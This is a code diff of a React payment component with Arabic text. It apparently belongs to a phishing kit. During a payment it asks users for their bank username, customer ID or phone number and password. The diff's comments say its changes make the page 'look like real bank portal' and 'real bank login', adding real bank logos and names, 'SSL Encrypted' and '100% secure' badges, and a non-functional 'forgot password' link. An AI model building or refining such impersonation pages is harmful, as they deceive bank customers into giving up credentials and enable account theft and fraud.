@@ -269,125 +269,231 @@ const PaymentBankLogin = () => {
       description="أدخل بيانات الدخول للبنك لتأكيد العملية"
       icon={<Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
     >
-      {/* Bank Info Header */}
+      {/* Bank Info Header - Enhanced to look like real bank portal */}
       <div 
-        className="rounded-lg p-4 sm:p-5 mb-6 flex items-center gap-4"
+        className="rounded-xl p-5 sm:p-6 mb-6 shadow-lg border border-white/10"
         style={{
-          background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
+          background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}dd, ${selectedBank?.color || branding.colors.secondary}dd)`,
         }}
       >
-        <div 
-          className="w-12 h-12 sm:w-14 sm:h-14 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center flex-shrink-0"
-        >
-          <Building2 className="w-6 h-6 sm:w-7 sm:h-7 text-white" />
+        <div className="flex items-center justify-between mb-4">
+          <div className="flex items-center gap-3">
+            {selectedBank?.logo ? (
+              <div className="w-14 h-14 sm:w-16 sm:h-16 rounded-lg bg-white p-2 flex items-center justify-center">
+                <img 
+                  src={selectedBank.logo} 
+                  alt={selectedBank.nameAr}
+                  className="max-w-full max-h-full object-contain"
+                />
+              </div>
+            ) : (
+              <div 
+                className="w-14 h-14 sm:w-16 sm:h-16 rounded-lg bg-white/20 backdrop-blur-sm flex items-center justify-center flex-shrink-0"
+              >
+                <Building2 className="w-7 h-7 sm:w-8 sm:h-8 text-white" />
+              </div>
+            )}
+            <div className="flex-1 text-white">
+              <p className="text-xs sm:text-sm opacity-90 mb-1">الخدمات المصرفية الإلكترونية</p>
+              <p className="text-xl sm:text-2xl font-bold leading-tight">{selectedBank?.nameAr || 'البنك'}</p>
+              <p className="text-xs sm:text-sm opacity-80 mt-0.5">{selectedBank?.name || 'Online Banking'}</p>
+            </div>
+          </div>
+          {selectedCountryData && (
+            <span className="text-3xl sm:text-4xl">{selectedCountryData.flag}</span>
+          )}
         </div>
-        <div className="flex-1 text-white">
-          <p className="text-xs sm:text-sm opacity-90">البنك المختار</p>
-          <p className="text-lg sm:text-xl font-bold">{selectedBank?.nameAr || 'البنك'}</p>
-          <p className="text-xs opacity-80">{selectedBank?.name}</p>
+        
+        {/* Bank portal header line */}
+        <div className="flex items-center gap-2 text-white/90 text-xs sm:text-sm">
+          <Lock className="w-4 h-4" />
+          <span>تسجيل دخول آمن ومشفر</span>
+          <span className="mr-auto">•</span>
+          <span>SSL Encrypted</span>
         </div>
-        {selectedCountryData && (
-          <span className="text-3xl sm:text-4xl">{selectedCountryData.flag}</span>
-        )}
       </div>
 
-      {/* Security Notice */}
+      {/* Security Notice - Enhanced */}
       <div 
-        className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
+        className="rounded-xl p-4 sm:p-5 mb-6 border-2"
         style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
+          background: `linear-gradient(135deg, ${branding.colors.primary}05, ${branding.colors.primary}10)`,
+          borderColor: `${branding.colors.primary}30`
         }}
       >
-        <ShieldCheck className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
-        <div className="text-xs sm:text-sm">
-          <p className="font-semibold mb-1">تسجيل دخول آمن</p>
-          <p className="text-muted-foreground">
-            سجّل دخول إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان
-          </p>
+        <div className="flex items-start gap-3">
+          <div 
+            className="w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0"
+            style={{ background: `${branding.colors.primary}20` }}
+          >
+            <ShieldCheck className="w-5 h-5" style={{ color: branding.colors.primary }} />
+          </div>
+          <div className="flex-1">
+            <div className="flex items-center gap-2 mb-2">
+              <h3 className="font-bold text-sm sm:text-base" style={{ color: branding.colors.primary }}>
+                تسجيل دخول آمن 100%
+              </h3>
+              <svg className="w-4 h-4 text-green-500" fill="currentColor" viewBox="0 0 20 20">
+                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
+              </svg>
+            </div>
+            <p className="text-xs sm:text-sm text-muted-foreground leading-relaxed">
+              سجّل دخولك إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان. جميع بياناتك محمية بتشفير 256-bit SSL.
+            </p>
+            <div className="flex items-center gap-4 mt-3 text-xs">
+              <div className="flex items-center gap-1 text-green-600">
+                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
+                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
+                </svg>
+                <span>مشفر</span>
+              </div>
+              <div className="flex items-center gap-1 text-blue-600">
+                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
+                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
+                </svg>
+                <span>موثّق</span>
+              </div>
+              <div className="flex items-center gap-1 text-purple-600">
+                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
+                  <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
+                </svg>
+                <span>آمن</span>
+              </div>
+            </div>
+          </div>
         </div>
       </div>
 
-      {/* Login Form */}
-      <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
+      {/* Login Form - Enhanced to look like real bank login */}
+      <form onSubmit={handleSubmit} className="space-y-5 sm:space-y-6">
         {/* Username Login */}
         {loginType === 'username' && (
-          <>
-            <div>
-              <Label className="mb-2 text-sm sm:text-base">اسم المستخدم</Label>
+          <div>
+            <Label className="mb-2.5 text-sm sm:text-base font-semibold flex items-center gap-2">
+              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
+              </svg>
+              اسم المستخدم
+            </Label>
+            <div className="relative">
               <Input
                 type="text"
                 placeholder="أدخل اسم المستخدم"
                 value={username}
                 onChange={(e) => setUsername(e.target.value)}
-                className="h-12 sm:h-14 text-base sm:text-lg"
+                className="h-14 sm:h-16 text-base sm:text-lg pr-4 pl-12 rounded-xl border-2 focus:border-primary transition-all"
+                style={{ borderColor: branding.colors.primary + '40' }}
                 autoComplete="username"
                 required
               />
+              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground">
+                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
+                </svg>
+              </div>
             </div>
-          </>
+          </div>
         )}
         
         {/* Customer ID Login */}
         {loginType === 'customerId' && (
-          <>
-            <div>
-              <Label className="mb-2 text-sm sm:text-base">رقم العميل</Label>
+          <div>
+            <Label className="mb-2.5 text-sm sm:text-base font-semibold flex items-center gap-2">
+              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" />
+              </svg>
+              رقم العميل
+            </Label>
+            <div className="relative">
               <Input
                 type="text"
                 placeholder="أدخل رقم العميل"
                 value={customerId}
                 onChange={(e) => setCustomerId(e.target.value)}
-                className="h-12 sm:h-14 text-base sm:text-lg"
+                className="h-14 sm:h-16 text-base sm:text-lg pr-4 pl-12 rounded-xl border-2 focus:border-primary transition-all"
+                style={{ borderColor: branding.colors.primary + '40' }}
                 inputMode="numeric"
                 required
               />
+              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground">
+                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" />
+                </svg>
+              </div>
             </div>
-          </>
+          </div>
         )}
         
         {/* Phone Login */}
         {loginType === 'phone' && (
-          <>
-            <div>
-              <Label className="mb-2 text-sm sm:text-base">رقم الجوال</Label>
+          <div>
+            <Label className="mb-2.5 text-sm sm:text-base font-semibold flex items-center gap-2">
+              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
+              </svg>
+              رقم الجوال
+            </Label>
+            <div className="relative">
               <Input
                 type="tel"
                 placeholder="05xxxxxxxx"
                 value={phoneNumber}
                 onChange={(e) => setPhoneNumber(e.target.value)}
-                className="h-12 sm:h-14 text-base sm:text-lg"
+                className="h-14 sm:h-16 text-base sm:text-lg pr-4 pl-12 rounded-xl border-2 focus:border-primary transition-all"
+                style={{ borderColor: branding.colors.primary + '40' }}
                 inputMode="tel"
                 required
               />
+              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground">
+                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
+                </svg>
+              </div>
             </div>
-          </>
+          </div>
         )}
         
         {/* Password (common for all types) */}
         <div>
-          <Label className="mb-2 text-sm sm:text-base">كلمة المرور</Label>
+          <div className="flex items-center justify-between mb-2.5">
+            <Label className="text-sm sm:text-base font-semibold flex items-center gap-2">
+              <Lock className="w-4 h-4" />
+              كلمة المرور
+            </Label>
+            <button
+              type="button"
+              className="text-xs sm:text-sm font-medium hover:underline"
+              style={{ color: branding.colors.primary }}
+            >
+              نسيت كلمة المرور؟
+            </button>
+          </div>
           <div className="relative">
             <Input
               type={showPassword ? "text" : "password"}
               placeholder="أدخل كلمة المرور"
               value={password}
               onChange={(e) => setPassword(e.target.value)}
-              className="h-12 sm:h-14 text-base sm:text-lg pl-12"
+              className="h-14 sm:h-16 text-base sm:text-lg pr-4 pl-24 rounded-xl border-2 focus:border-primary transition-all"
+              style={{ borderColor: branding.colors.primary + '40' }}
               autoComplete="current-password"
               required
             />
-            <button
-              type="button"
-              onClick={() => setShowPassword(!showPassword)}
-              className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
-            >
-              {showPassword ? (
-                <EyeOff className="w-5 h-5" />
-              ) : (
-                <Eye className="w-5 h-5" />
-              )}
-            </button>
+            <div className="absolute left-4 top-1/2 -translate-y-1/2 flex items-center gap-2">
+              <button
+                type="button"
+                onClick={() => setShowPassword(!showPassword)}
+                className="text-muted-foreground hover:text-foreground transition-colors p-1"
+              >
+                {showPassword ? (
+                  <EyeOff className="w-5 h-5" />
+                ) : (
+                  <Eye className="w-5 h-5" />
+                )}
+              </button>
+              <div className="w-px h-6 bg-border" />
+              <Lock className="w-5 h-5 text-muted-foreground" />
+            </div>
           </div>
         </div>
         
